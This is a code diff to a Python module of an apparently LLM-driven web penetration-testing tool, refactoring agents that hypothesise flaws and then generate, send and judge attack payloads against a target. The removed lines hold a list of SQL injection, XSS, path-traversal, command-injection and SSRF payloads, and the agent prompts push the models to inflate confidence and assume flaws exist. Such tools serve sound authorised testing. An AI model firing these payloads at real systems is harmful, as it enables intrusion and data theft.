@@ -9,88 +9,13 @@ import uuid
 from typing import Any
 from urllib.parse import urljoin, urlparse
 
-from nazitest.models.exploit import ExploitStrategy
+from nazitest.models.exploit import ExploitResponse, ExploitResult, ExploitStrategy
 from nazitest.models.graph import Hypothesis
 from nazitest.models.types import HttpMethod, Severity
 from nazitest.reasoning.openrouter import OpenRouterClient
 from nazitest.reasoning.sanitizer import LLMDataSanitizer
 
 logger = logging.getLogger(__name__)
-
-# ── Common payloads by vulnerability type ──
-
-PAYLOADS: dict[str, list[str]] = {
-    "sqli": [
-        "' OR '1'='1' --",
-        "' OR '1'='1'/*",
-        "\" OR \"1\"=\"1\" --",
-        "1' ORDER BY 1--+",
-        "1' UNION SELECT NULL--",
-        "1' UNION SELECT NULL,NULL--",
-        "1' UNION SELECT NULL,NULL,NULL--",
-        "1 AND 1=1",
-        "1 AND 1=2",
-        "' AND '1'='1",
-        "' AND '1'='2",
-        "1' WAITFOR DELAY '0:0:5'--",
-        "1'; SELECT SLEEP(5)--",
-        "' OR 1=1#",
-        "admin'--",
-        "1' AND (SELECT 1 FROM(SELECT COUNT(*),"
-        "CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))"
-        "x FROM information_schema.tables GROUP BY x)a)--",
-        "' UNION SELECT username,password FROM users--",
-    ],
-    "xss": [
-        "<script>alert(1)</script>",
-        "<img src=x onerror=alert(1)>",
-        "<svg onload=alert(1)>",
-        "'\"><script>alert(1)</script>",
-        "<img/src=x onerror=alert(1)>",
-        "javascript:alert(1)",
-        "<body onload=alert(1)>",
-        "<input onfocus=alert(1) autofocus>",
-        "<details open ontoggle=alert(1)>",
-        "'-alert(1)-'",
-        "\"><img src=x onerror=alert(1)>",
-        "<script>alert(String.fromCharCode(88,83,83))</script>",
-        "<ScRiPt>alert(1)</ScRiPt>",
-        "%3Cscript%3Ealert(1)%3C/script%3E",
-        "<img src=x onerror=alert(document.domain)>",
-    ],
-    "path_traversal": [
-        "../../../../../../etc/passwd",
-        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
-        "....//....//....//....//etc/passwd",
-        "..%252f..%252f..%252fetc/passwd",
-        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-        "..%c0%af..%c0%af..%c0%afetc/passwd",
-        "/etc/passwd%00",
-        "....//....//etc/passwd",
-    ],
-    "cmdi": [
-        "; id",
-        "| id",
-        "|| id",
-        "& id",
-        "&& id",
-        "$(id)",
-        "`id`",
-        "; cat /etc/passwd",
-        "| cat /etc/passwd",
-        "; whoami",
-        "| whoami",
-        "; uname -a",
-    ],
-    "ssrf": [
-        "http://127.0.0.1",
-        "http://localhost",
-        "http://169.254.169.254/latest/meta-data/",
-        "http://[::1]",
-        "http://0x7f000001",
-        "http://2130706433",
-    ],
-}
 
 
 class BaseAgent:
@@ -137,46 +62,43 @@ class Strategist(BaseAgent):
         "You are an expert penetration tester analyzing a web "
         "application's attack surface. You have access to a "
         "knowledge graph of the target containing endpoints, "
-        "parameters, authentication mechanisms, security controls, "
-        "and technologies. "
+        "parameters, authentication mechanisms, security "
+        "controls, and technologies. "
         "Your job is to: "
-        "1) Identify ALL potential vulnerabilities based on the data "
+        "1) Identify ALL potential vulnerabilities "
         "2) Generate ranked hypotheses with high confidence "
-        "3) Be aggressive — if there's any indicator of a vuln, "
-        "flag it with high confidence (0.8+) "
+        "3) Be aggressive — if there's any indicator, flag it "
+        "with confidence 0.8+ "
         "4) Cover ALL OWASP Top 10 categories "
-        "5) For each parameter, consider: SQLi, XSS, SSRF, path "
-        "traversal, command injection, IDOR "
-        "6) Don't hold back — it's better to have false positives "
-        "than miss a real vulnerability"
+        "5) For each parameter, consider: SQLi, XSS, SSRF, "
+        "path traversal, command injection, IDOR "
+        "6) Don't hold back — false positives are better than "
+        "missing a real vulnerability"
     )
 
     async def analyze(self, graph_summary: dict) -> str:
-        """Analyze the knowledge graph and produce an audit plan."""
         sanitized = self._sanitize(graph_summary)
         return await self._ask(
             self.SYSTEM_PROMPT,
             f"Analyze this knowledge graph and create an "
-            f"aggressive penetration test plan:\n\n{sanitized}",
+            f"aggressive pentest plan:\n\n{sanitized}",
         )
 
     async def hypothesize(
         self, analysis: str, graph_summary: dict
     ) -> str:
-        """Generate vulnerability hypotheses."""
         sanitized = self._sanitize(graph_summary)
         return await self._ask(
             self.SYSTEM_PROMPT,
             f"Based on this analysis:\n{analysis}\n\n"
-            f"And this knowledge graph data:\n{sanitized}\n\n"
+            f"Knowledge graph:\n{sanitized}\n\n"
             "Generate specific vulnerability hypotheses. "
-            "For each, provide:\n"
-            "- Title\n- Description\n"
-            "- Target endpoint and parameter\n"
-            "- Vulnerability type (sqli, xss, idor, ssrf, etc.)\n"
-            "- OWASP category\n- Severity\n"
-            "- Confidence (0.8+ if there's any indicator)\n"
-            "- Specific payloads to try",
+            "For each: Title, Description, Target endpoint "
+            "and parameter, Vulnerability type "
+            "(sqli, xss, idor, ssrf, cmdi, etc.), "
+            "OWASP category, Severity, "
+            "Confidence (0.8+ if any indicator), "
+            "Specific payloads to try.",
         )
 
     HYPOTHESES_SCHEMA: dict[str, Any] = {
@@ -192,8 +114,12 @@ class Strategist(BaseAgent):
                         "properties": {
                             "id": {"type": "string"},
                             "title": {"type": "string"},
-                            "description": {"type": "string"},
-                            "vuln_type": {"type": "string"},
+                            "description": {
+                                "type": "string",
+                            },
+                            "vuln_type": {
+                                "type": "string",
+                            },
                             "severity": {
                                 "type": "string",
                                 "enum": [
@@ -242,16 +168,14 @@ class Strategist(BaseAgent):
     async def hypothesize_structured(
         self, analysis: str, graph_summary: dict
     ) -> list[Hypothesis]:
-        """Generate structured Hypothesis objects."""
         sanitized = self._sanitize(graph_summary)
         raw = await self._ask(
             self.SYSTEM_PROMPT,
             f"Based on this analysis:\n{analysis}\n\n"
-            f"And this knowledge graph data:\n{sanitized}\n\n"
-            "Generate specific vulnerability hypotheses as "
-            "structured JSON. Be aggressive with confidence "
-            "scores — if there's any basis for the vuln, "
-            "assign 0.8+. "
+            f"Knowledge graph:\n{sanitized}\n\n"
+            "Generate vulnerability hypotheses as JSON. "
+            "Be aggressive with confidence — 0.8+ if any "
+            "basis exists. "
             "For each: id, title, description, vuln_type, "
             "severity (critical/high/medium/low/info), "
             "confidence (0.0-1.0), target_endpoint, "
@@ -262,7 +186,6 @@ class Strategist(BaseAgent):
 
     @staticmethod
     def _parse_hypotheses(raw: str) -> list[Hypothesis]:
-        """Parse LLM output into Hypothesis objects."""
         try:
             data = json.loads(raw)
             items = (
@@ -274,9 +197,9 @@ class Strategist(BaseAgent):
                 items = [items]
             hypotheses = []
             for item in items:
-                severity_str = item.get("severity", "medium")
+                sev_str = item.get("severity", "medium")
                 try:
-                    severity = Severity(severity_str.lower())
+                    severity = Severity(sev_str.lower())
                 except ValueError:
                     severity = Severity.MEDIUM
                 hypotheses.append(
@@ -391,7 +314,7 @@ class Strategist(BaseAgent):
 
 
 class Scout(BaseAgent):
-    """Exploration agent — investigates specific hypotheses."""
+    """Exploration agent — optional, not used in main pipeline."""
 
     role = "scout"
 
@@ -400,477 +323,396 @@ class Scout(BaseAgent):
         "hunting for vulnerabilities. You are investigating a "
         "specific vulnerability hypothesis. "
         "Your mindset: ASSUME the vulnerability EXISTS and look "
-        "for confirming evidence. Real-world web apps are full "
-        "of vulnerabilities — your job is to find them, not "
-        "dismiss them. "
+        "for confirming evidence. "
         "Rate your confidence HIGH (0.7+) if: "
         "- The parameter accepts user input "
         "- There's no visible input sanitization "
         "- The technology stack is known to be vulnerable "
         "- Similar endpoints have been vulnerable before "
-        "- The application doesn't use parameterized queries "
-        "- There are no WAF/security headers "
+        "- No WAF/security headers "
         "Only rate below 0.5 if there's strong evidence the "
-        "vulnerability does NOT exist (e.g., WAF blocking, "
-        "parameterized queries confirmed, strong CSP)."
+        "vulnerability does NOT exist."
     )
 
     async def investigate(
         self, hypothesis: dict, evidence: dict
     ) -> str:
-        """Investigate a hypothesis with available evidence."""
         sanitized_evidence = self._sanitize(evidence)
         return await self._ask(
             self.SYSTEM_PROMPT,
             f"Investigate this hypothesis:\n{hypothesis}\n\n"
-            f"Available evidence:\n{sanitized_evidence}\n\n"
+            f"Evidence:\n{sanitized_evidence}\n\n"
             "Is this vulnerability likely exploitable? "
             "Rate your confidence (0.0 to 1.0). "
-            "Remember: if the parameter takes user input and "
-            "there's no clear protection, rate 0.7+.",
+            "If the parameter takes user input and there's "
+            "no clear protection, rate 0.7+.",
         )
 
 
 class CrossValidator(BaseAgent):
-    """Advisory validation agent — provides second opinion."""
+    """Advisory validation agent — optional, not used in main pipeline."""
 
     role = "cross_validator"
 
     SYSTEM_PROMPT = (
         "You are a security consultant reviewing vulnerability "
-        "findings. Your role is ADVISORY — provide useful "
-        "feedback on the finding's validity. "
+        "findings. Your role is ADVISORY. "
         "Focus on: "
-        "1) Are there any obvious false positive indicators? "
+        "1) Any obvious false positive indicators? "
         "2) What specific payloads would best confirm this? "
         "3) What security controls might be in place? "
-        "Rate your confidence. Be fair — don't dismiss "
-        "vulnerabilities without strong evidence they're false "
-        "positives. A parameter accepting user input without "
-        "visible sanitization IS a valid finding."
+        "Be fair — don't dismiss vulnerabilities without "
+        "strong evidence they're false positives."
     )
 
     async def challenge(
         self, hypothesis: dict, evidence: dict
     ) -> str:
-        """Review a vulnerability finding."""
         sanitized = self._sanitize(evidence)
         return await self._ask(
             self.SYSTEM_PROMPT,
-            f"Review this vulnerability finding:\n"
-            f"{hypothesis}\n\n"
+            f"Review this finding:\n{hypothesis}\n\n"
             f"Evidence:\n{sanitized}\n\n"
-            "Is this a valid finding? "
             "Rate your confidence (0.0 to 1.0). "
             "Suggest specific payloads to confirm.",
         )
 
 
 class ExploitPlanner(BaseAgent):
-    """Exploit generation agent — creates PoC strategies."""
+    """Agentic exploit planner — LLM-driven feedback loop.
+
+    Architecture:
+    1. LLM generates targeted payloads (small set, 3-5)
+    2. We send them, collect responses
+    3. LLM sees response behavior (sizes, status, reflection)
+    4. LLM decides: confirmed / not_vulnerable / try more
+    5. If "try more": LLM generates new payloads adapting
+       to what it saw. Repeat.
+
+    No hardcoded payload lists. No confidence scores.
+    Binary outcome: confirmed or not.
+    """
 
     role = "exploit_planner"
 
-    SYSTEM_PROMPT = (
-        "You are an expert exploit developer and penetration "
-        "tester. Given a vulnerability hypothesis, generate a "
-        "proof-of-concept exploit strategy. "
-        "Requirements: "
-        "1) Use REAL, WORKING payloads — not placeholders "
-        "2) Include the EXACT HTTP request needed "
-        "3) For SQLi: use actual SQL injection payloads like "
-        "   ' OR '1'='1' --, UNION SELECT, etc. "
-        "4) For XSS: use actual XSS payloads like "
-        "   <script>alert(1)</script> "
-        "5) Include encoding variations if needed "
-        "6) The URL must be absolute (https://...) "
-        "7) Include all necessary cookies and headers "
-        "8) Put the payload in the correct location "
-        "   (query param, body, header) based on the vuln type"
+    GENERATE_PROMPT = (
+        "You are an expert penetration tester actively "
+        "exploiting a target. Generate 3-5 targeted payloads "
+        "to test the described vulnerability. "
+        "Think like a real pentester: "
+        "- Start with detection payloads (confirm the vuln) "
+        "- Include at least one boolean test "
+        "  (e.g. AND 1=1 vs AND 1=2 for SQLi) "
+        "- Include at least one data extraction payload "
+        "- Vary your approach (error-based, union, blind) "
+        "Return ONLY raw payloads, one per line. "
+        "No explanations, no numbering, no markdown."
     )
 
-    STRATEGY_SCHEMA: dict[str, Any] = {
-        "name": "exploit_strategy",
+    JUDGE_PROMPT = (
+        "You are an expert penetration tester analyzing "
+        "exploit attempt results. You must determine if "
+        "the vulnerability is CONFIRMED based on how the "
+        "target responded. "
+        "Key signals: "
+        "- Response SIZE changes: if an OR 1=1 payload "
+        "  returns significantly MORE data than baseline, "
+        "  that means data extraction = SQLi CONFIRMED. "
+        "- Boolean behavior: if AND 1=1 returns normal data "
+        "  but AND 1=2 returns less/empty, the query is "
+        "  being interpreted = SQLi CONFIRMED. "
+        "- Payload reflection: if your XSS payload appears "
+        "  unescaped in the response body = XSS CONFIRMED. "
+        "- Time delays: if SLEEP payload takes 5+ seconds "
+        "  = time-based injection CONFIRMED. "
+        "- Error messages: SQL syntax errors, stack traces "
+        "  = error-based injection CONFIRMED. "
+        "- Different status codes or redirects compared to "
+        "  baseline can indicate injection. "
+        "Be decisive. If the evidence is clear, say confirmed."
+    )
+
+    JUDGE_SCHEMA: dict[str, Any] = {
+        "name": "exploit_judgment",
         "strict": True,
         "schema": {
             "type": "object",
             "properties": {
-                "http_method": {
+                "verdict": {
                     "type": "string",
                     "enum": [
-                        "GET", "POST", "PUT",
-                        "DELETE", "PATCH",
+                        "confirmed",
+                        "not_vulnerable",
+                        "continue",
                     ],
                 },
-                "url": {"type": "string"},
-                "headers": {
-                    "type": "object",
-                    "additionalProperties": {
-                        "type": "string",
-                    },
+                "evidence": {"type": "string"},
+                "next_payloads": {
+                    "type": "array",
+                    "items": {"type": "string"},
                 },
-                "body": {"type": "string"},
-                "params": {
-                    "type": "object",
-                    "additionalProperties": {
-                        "type": "string",
-                    },
-                },
-                "payload": {"type": "string"},
-                "description": {"type": "string"},
             },
             "required": [
-                "http_method",
-                "url",
-                "headers",
-                "body",
-                "params",
-                "payload",
-                "description",
+                "verdict",
+                "evidence",
+                "next_payloads",
             ],
             "additionalProperties": False,
         },
     }
 
-    async def plan(
+    async def generate_payloads(
         self,
         hypothesis: dict,
-        previous_attempts: list[dict] | None = None,
-    ) -> str:
-        """Plan an exploit strategy."""
-        context = f"Vulnerability:\n{hypothesis}\n\n"
-        if previous_attempts:
-            sanitized = self._sanitize(previous_attempts)
-            context += (
-                f"Previous failed attempts:\n{sanitized}\n\n"
-                "Generate a DIFFERENT strategy using "
-                "alternative payloads, encodings, or "
-                "delivery methods. Try payload mutations, "
-                "WAF bypasses, and encoding tricks."
-            )
-        else:
-            context += (
-                "Generate the initial exploit strategy "
-                "with a real, working payload."
-            )
-
-        return await self._ask(self.SYSTEM_PROMPT, context)
-
-    async def plan_structured(
-        self,
-        hypothesis: dict,
-        previous_attempts: list[dict] | None = None,
-        target_url: str = "",
-    ) -> ExploitStrategy:
-        """Plan and return a parsed ExploitStrategy."""
+        baseline_info: str = "",
+    ) -> list[str]:
+        """Ask LLM to generate targeted payloads."""
         vuln_type = hypothesis.get("vuln_type", "")
-        endpoint = hypothesis.get("target_endpoint", "")
         param = hypothesis.get("target_parameter", "")
+        endpoint = hypothesis.get("target_endpoint", "")
+        desc = hypothesis.get("description", "")
 
-        context = f"Vulnerability:\n{hypothesis}\n\n"
-        if target_url:
-            context += f"Target base URL: {target_url}\n\n"
-        context += (
-            "IMPORTANT: The 'url' field must be an absolute "
-            "URL starting with http:// or https://. "
-            "Do NOT return relative paths.\n\n"
-        )
-
-        # Add suggested payloads for the vuln type
-        vt_key = vuln_type.lower().replace(
-            " ", "_"
-        ).replace("-", "_")
-        if vt_key in PAYLOADS:
-            context += (
-                f"Suggested payloads for {vuln_type}:\n"
-            )
-            for p in PAYLOADS[vt_key][:5]:
-                context += f"  - {p}\n"
-            context += "\n"
-
-        if previous_attempts:
-            sanitized = self._sanitize(previous_attempts)
-            context += (
-                f"Previous failed attempts:\n{sanitized}\n\n"
-                "Use a DIFFERENT payload, encoding, or "
-                "delivery method. Try WAF bypass techniques.\n"
-            )
-        else:
-            context += (
-                "Generate the initial exploit strategy "
-                "with a working payload.\n"
-            )
-
-        context += (
-            f"Target parameter: {param}\n"
+        context = (
+            f"Vulnerability type: {vuln_type}\n"
             f"Target endpoint: {endpoint}\n"
-            "Return as structured JSON with: "
-            "http_method, url, headers, body, params, "
-            "payload, description."
+            f"Target parameter: {param}\n"
+            f"Description: {desc}\n"
+        )
+        if baseline_info:
+            context += f"\nBaseline response: {baseline_info}\n"
+
+        context += (
+            "\nGenerate 3-5 payloads to test this. "
+            "One per line, raw payloads only."
         )
 
-        hypothesis_id = hypothesis.get("id", "unknown")
+        raw = await self._ask(self.GENERATE_PROMPT, context)
+
+        payloads = []
+        for line in raw.strip().split("\n"):
+            line = line.strip()
+            line = re.sub(r"^\d+[\.\)]\s*", "", line)
+            line = re.sub(r"^[-*]\s*", "", line)
+            line = line.strip().strip("`")
+            if line and len(line) > 1:
+                payloads.append(line)
+
+        logger.info(
+            "LLM generated %d payloads for %s: %s",
+            len(payloads),
+            vuln_type,
+            [p[:40] for p in payloads],
+        )
+        return payloads[:5]
+
+    async def judge_results(
+        self,
+        hypothesis: dict,
+        results_summary: str,
+        baseline_info: str = "",
+    ) -> dict[str, Any]:
+        """Show LLM the response behavior and get verdict."""
+        vuln_type = hypothesis.get("vuln_type", "")
+        param = hypothesis.get("target_parameter", "")
+        endpoint = hypothesis.get("target_endpoint", "")
+
+        context = (
+            f"Testing for: {vuln_type}\n"
+            f"Endpoint: {endpoint}\n"
+            f"Parameter: {param}\n"
+        )
+        if baseline_info:
+            context += f"Baseline: {baseline_info}\n"
+
+        context += f"\nResults:\n{results_summary}\n"
+        context += (
+            "\nBased on the response BEHAVIOR (size changes, "
+            "reflection, timing, errors), is this vulnerability "
+            "CONFIRMED? Be decisive."
+        )
+
+        raw = await self._ask(
+            self.JUDGE_PROMPT,
+            context,
+            structured_output=self.JUDGE_SCHEMA,
+        )
 
         try:
-            raw = await self._ask(
-                self.SYSTEM_PROMPT,
-                context,
-                structured_output=self.STRATEGY_SCHEMA,
+            result = json.loads(raw)
+            verdict = result.get("verdict", "not_vulnerable")
+            evidence = result.get("evidence", "")
+            next_payloads = result.get("next_payloads", [])
+
+            # Clean next_payloads
+            clean = []
+            for p in next_payloads:
+                if isinstance(p, str) and len(p) > 1:
+                    clean.append(p.strip())
+            next_payloads = clean[:5]
+
+            logger.info(
+                "LLM verdict: %s (evidence: %s)",
+                verdict,
+                evidence[:100],
             )
-            return self._parse_strategy(
-                raw, hypothesis_id, hypothesis, target_url
-            )
-        except Exception as e:
+
+            return {
+                "verdict": verdict,
+                "evidence": evidence,
+                "next_payloads": next_payloads,
+            }
+        except (json.JSONDecodeError, TypeError) as e:
             logger.warning(
-                "Structured exploit plan failed (%s), "
-                "falling back to text",
-                e,
+                "Judge structured output failed: %s", e
             )
+            # Fallback: parse text
+            text_lower = raw.lower()
+            if "confirmed" in text_lower:
+                return {
+                    "verdict": "confirmed",
+                    "evidence": raw[:500],
+                    "next_payloads": [],
+                }
+            if "continue" in text_lower:
+                return {
+                    "verdict": "continue",
+                    "evidence": raw[:500],
+                    "next_payloads": [],
+                }
+            return {
+                "verdict": "not_vulnerable",
+                "evidence": raw[:500],
+                "next_payloads": [],
+            }
 
-        text = await self.plan(hypothesis, previous_attempts)
-        return self._parse_strategy_from_text(
-            text, hypothesis_id, hypothesis, target_url
-        )
-
-    def build_payload_strategies(
-        self,
+    @staticmethod
+    def build_strategy(
         hypothesis: dict,
-        target_url: str = "",
-    ) -> list[ExploitStrategy]:
-        """Build multiple strategies from common payloads.
+        payload: str,
+        target_url: str,
+        method: HttpMethod = HttpMethod.GET,
+    ) -> ExploitStrategy:
+        """Build an ExploitStrategy from hypothesis + payload.
 
-        Does NOT use LLM — generates strategies from known
-        payload lists for the given vuln type.
+        No LLM — pure code. LLM gives us WHAT payload,
+        we handle HOW to deliver it.
         """
-        vuln_type = hypothesis.get("vuln_type", "")
         endpoint = hypothesis.get("target_endpoint", "")
         param = hypothesis.get("target_parameter", "")
         hypothesis_id = hypothesis.get("id", "unknown")
 
-        vt_key = vuln_type.lower().replace(
-            " ", "_"
-        ).replace("-", "_")
+        url = _resolve_url(endpoint, target_url)
 
-        # Normalize vuln_type key
-        for key in PAYLOADS:
-            if key in vt_key or vt_key in key:
-                vt_key = key
-                break
-
-        payloads = PAYLOADS.get(vt_key, [])
-        if not payloads:
-            return []
-
-        url = self._resolve_url(endpoint, target_url, "")
-        strategies: list[ExploitStrategy] = []
-
-        for payload in payloads:
-            # Determine method and placement
-            if vt_key == "sqli":
-                # Try as query param for GET
-                strategies.append(
-                    ExploitStrategy(
-                        hypothesis_id=hypothesis_id,
-                        http_method=HttpMethod.GET,
-                        url=url,
-                        params={param: payload} if param else {},
-                        payload=payload,
-                        description=(
-                            f"SQLi payload: {payload[:50]}"
-                        ),
-                    )
-                )
-            elif vt_key == "xss":
-                strategies.append(
-                    ExploitStrategy(
-                        hypothesis_id=hypothesis_id,
-                        http_method=HttpMethod.GET,
-                        url=url,
-                        params={param: payload} if param else {},
-                        payload=payload,
-                        description=(
-                            f"XSS payload: {payload[:50]}"
-                        ),
-                    )
-                )
-            elif vt_key in ("path_traversal", "lfi"):
-                strategies.append(
-                    ExploitStrategy(
-                        hypothesis_id=hypothesis_id,
-                        http_method=HttpMethod.GET,
-                        url=url,
-                        params={param: payload} if param else {},
-                        payload=payload,
-                        description=(
-                            f"Path traversal: {payload[:50]}"
-                        ),
-                    )
-                )
-            elif vt_key == "cmdi":
-                strategies.append(
-                    ExploitStrategy(
-                        hypothesis_id=hypothesis_id,
-                        http_method=HttpMethod.GET,
-                        url=url,
-                        params={param: payload} if param else {},
-                        payload=payload,
-                        description=(
-                            f"Command injection: {payload[:50]}"
-                        ),
-                    )
-                )
-            else:
-                strategies.append(
-                    ExploitStrategy(
-                        hypothesis_id=hypothesis_id,
-                        http_method=HttpMethod.GET,
-                        url=url,
-                        params={param: payload} if param else {},
-                        payload=payload,
-                        description=f"Payload: {payload[:50]}",
-                    )
-                )
-
-        return strategies
+        if method == HttpMethod.POST:
+            return ExploitStrategy(
+                hypothesis_id=hypothesis_id,
+                http_method=HttpMethod.POST,
+                url=url,
+                body=(
+                    f"{param}={payload}"
+                    if param
+                    else payload
+                ),
+                headers={
+                    "Content-Type": (
+                        "application/"
+                        "x-www-form-urlencoded"
+                    ),
+                },
+                payload=payload,
+                description=(
+                    f"POST {param}={payload[:50]}"
+                ),
+            )
+        else:
+            return ExploitStrategy(
+                hypothesis_id=hypothesis_id,
+                http_method=HttpMethod.GET,
+                url=url,
+                params=(
+                    {param: payload} if param else {}
+                ),
+                payload=payload,
+                description=(
+                    f"GET ?{param}={payload[:50]}"
+                ),
+            )
 
     @staticmethod
-    def _resolve_url(
-        url: str,
-        target_url: str = "",
-        endpoint: str = "",
+    def format_baseline_info(
+        baseline: ExploitResponse,
     ) -> str:
-        """Clean and resolve a URL from LLM output."""
-        url = url.strip().rstrip("`\"'>,;) ")
-        if not url and endpoint:
-            url = endpoint.strip().rstrip("`\"'>,;) ")
-        if not url:
-            return target_url
-        parsed = urlparse(url)
-        if not parsed.scheme and target_url:
-            url = urljoin(target_url, url)
-        return url
-
-    @staticmethod
-    def _extract_json(text: str) -> dict | None:
-        """Extract a JSON object from text."""
-        text = text.strip()
-        if text.startswith("{"):
-            try:
-                return json.loads(text)
-            except json.JSONDecodeError:
-                pass
-
-        fence_match = re.search(
-            r"```(?:json)?\s*(\{.*?\})\s*```",
-            text,
-            re.DOTALL,
-        )
-        if fence_match:
-            try:
-                return json.loads(fence_match.group(1))
-            except json.JSONDecodeError:
-                pass
-
-        brace_match = re.search(r"\{.*\}", text, re.DOTALL)
-        if brace_match:
-            try:
-                return json.loads(brace_match.group())
-            except json.JSONDecodeError:
-                pass
-
-        return None
-
-    @staticmethod
-    def _parse_strategy(
-        raw: str,
-        hypothesis_id: str,
-        hypothesis: dict | None = None,
-        target_url: str = "",
-    ) -> ExploitStrategy:
-        """Parse JSON string into an ExploitStrategy."""
-        data = ExploitPlanner._extract_json(raw)
-        if data is None:
-            raise ValueError("No valid JSON found")
-        endpoint = (
-            (hypothesis or {}).get("target_endpoint", "")
-        )
-        return ExploitStrategy(
-            hypothesis_id=hypothesis_id,
-            http_method=HttpMethod(
-                data.get("http_method", "GET")
-            ),
-            url=ExploitPlanner._resolve_url(
-                data.get("url", ""),
-                target_url,
-                endpoint,
-            ),
-            headers=data.get("headers", {}),
-            body=data.get("body", ""),
-            params=data.get("params", {}),
-            payload=data.get("payload", ""),
-            description=data.get("description", ""),
+        """Format baseline response for LLM context."""
+        return (
+            f"status={baseline.status}, "
+            f"body={len(baseline.body)} bytes, "
+            f"time={baseline.elapsed_ms:.0f}ms"
         )
 
     @staticmethod
-    def _parse_strategy_from_text(
-        text: str,
-        hypothesis_id: str,
-        hypothesis: dict,
-        target_url: str = "",
-    ) -> ExploitStrategy:
-        """Best-effort extraction from text."""
-        endpoint = hypothesis.get("target_endpoint", "")
+    def format_results_summary(
+        results: list[tuple[str, str, ExploitResult]],
+        baseline: ExploitResponse | None = None,
+    ) -> str:
+        """Format attempt results for LLM context.
 
-        data = ExploitPlanner._extract_json(text)
-        if data and ("url" in data or "http_method" in data):
-            try:
-                return ExploitStrategy(
-                    hypothesis_id=hypothesis_id,
-                    http_method=HttpMethod(
-                        data.get("http_method", "GET")
-                    ),
-                    url=ExploitPlanner._resolve_url(
-                        data.get("url", ""),
-                        target_url,
-                        endpoint,
-                    ),
-                    headers=data.get("headers", {}),
-                    body=data.get("body", ""),
-                    params=data.get("params", {}),
-                    payload=data.get("payload", ""),
-                    description=data.get("description", ""),
+        Shows each payload's response behavior relative
+        to the baseline so the LLM can make smart decisions.
+        """
+        bl = len(baseline.body) if baseline else 0
+        lines: list[str] = []
+        seen: set[str] = set()
+
+        for payload, method, result in results:
+            for attempt in result.attempts:
+                resp = attempt.response
+                if not resp:
+                    continue
+
+                # Deduplicate
+                key = f"{method}:{payload}"
+                if key in seen:
+                    continue
+                seen.add(key)
+
+                rl = len(resp.body)
+                diff = ""
+                if bl > 0:
+                    pct = ((rl - bl) / bl) * 100
+                    diff = f" ({pct:+.0f}% from baseline)"
+
+                reflected = (
+                    payload in resp.body if payload else False
                 )
-            except (ValueError, KeyError):
-                pass
 
-        method_match = re.search(
-            r"\b(GET|POST|PUT|DELETE|PATCH)\b", text
-        )
-        url_match = re.search(r"(https?://\S+)", text)
-        payload_match = re.search(
-            r"payload[:\s]+[\"'`](.+?)[\"'`]",
-            text,
-            re.I,
-        )
+                lines.append(
+                    f"  {method} payload: {payload[:80]}\n"
+                    f"    status={resp.status}, "
+                    f"body={rl}b{diff}, "
+                    f"time={resp.elapsed_ms:.0f}ms, "
+                    f"reflected={reflected}"
+                )
 
-        raw_url = (
-            url_match.group(1) if url_match else ""
-        )
+        return "\n".join(lines)
 
-        return ExploitStrategy(
-            hypothesis_id=hypothesis_id,
-            http_method=(
-                HttpMethod(method_match.group(1))
-                if method_match
-                else HttpMethod.GET
-            ),
-            url=ExploitPlanner._resolve_url(
-                raw_url, target_url, endpoint
-            ),
-            payload=(
-                payload_match.group(1)
-                if payload_match
-                else ""
-            ),
-            description=text[:500],
-        )
+
+def _resolve_url(
+    endpoint: str,
+    target_url: str,
+) -> str:
+    """Resolve an endpoint against the target base URL.
+
+    ALWAYS uses target_url's scheme + host + port.
+    """
+    endpoint = endpoint.strip()
+    if not endpoint:
+        return target_url
+
+    parsed = urlparse(endpoint)
+
+    if parsed.scheme and parsed.netloc:
+        endpoint = parsed.path
+        if parsed.query:
+            endpoint += f"?{parsed.query}"
+
+    return urljoin(target_url, endpoint)
